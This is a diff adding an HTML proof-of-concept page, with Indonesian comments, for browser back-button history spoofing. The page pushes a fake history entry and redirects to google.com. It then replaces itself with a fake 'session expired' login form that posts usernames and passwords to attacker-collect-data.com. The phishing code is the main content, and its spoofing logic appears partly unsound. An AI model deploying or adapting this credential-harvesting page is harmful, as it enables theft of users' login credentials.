@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi Akun Penting</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            background-color: #f0f2f5;
+        }
+        .loading-container {
+            text-align: center;
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        h2 {
+            color: #333;
+        }
+        p {
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-container">
+        <h2>Mohon Tunggu...</h2>
+        <p>Anda sedang diarahkan ke halaman yang aman.</p>
+        <p>Jika tidak teralihkan, klik <a href="https://www.google.com" target="_self">di sini</a>.</p>
+    </div>
+
+    <script>
+        // Penting: Segera alihkan ke situs tepercaya
+        // Gunakan location.replace() untuk mencegah halaman attacker ada di riwayat browser
+        // *sebelum* situs tepercaya, namun dalam beberapa browser/kondisi, location.href
+        // masih bisa menunjukkan perilaku spoofing pada "back" button jika ada entry palsu di history.
+        // Untuk PoC yang lebih pasti, seringkali dibutuhkan manipulasi history.pushState.
+        window.history.pushState({}, '', '/'); // Tambahkan entri palsu ke history
+        window.location.href = "https://www.google.com"; // Redirect ke situs tepercaya
+
+        // Kode di bawah ini hanya akan terlihat jika pengguna menekan tombol "Back"
+        // setelah redirect di atas terjadi dan spoofing berhasil.
+        document.addEventListener('DOMContentLoaded', function() {
+            if (window.location.href.includes("google.com") && document.referrer.includes("malicious-site.com")) {
+                 // Ini adalah indikasi bahwa spoofing mungkin terjadi,
+                 // tetapi konten ini akan dieksekusi setelah "back" ditekan.
+                document.body.innerHTML = `
+                    <div style="text-align: center; padding: 50px; background-color: #ffe0e0; border: 1px solid #ff0000; margin: 20px;">
+                        <h2>Peringatan Keamanan!</h2>
+                        <p>Sesi Anda telah berakhir. Mohon masukkan kembali kredensial Anda.</p>
+                        <form action="https://attacker-collect-data.com/login" method="POST">
+                            <label for="username">Username:</label><br>
+                            <input type="text" id="username" name="username" required><br><br>
+                            <label for="password">Password:</label><br>
+                            <input type="password" id="password" name="password" required><br><br>
+                            <button type="submit">Login</button>
+                        </form>
+                        <p style="font-size: 0.8em; color: #888;">Ini adalah halaman simulasi. URL di address bar mungkin terlihat berbeda dari yang Anda harapkan.</p>
+                    </div>
+                `;
+            }
+        });
+    </script>
+</body>
+</html>
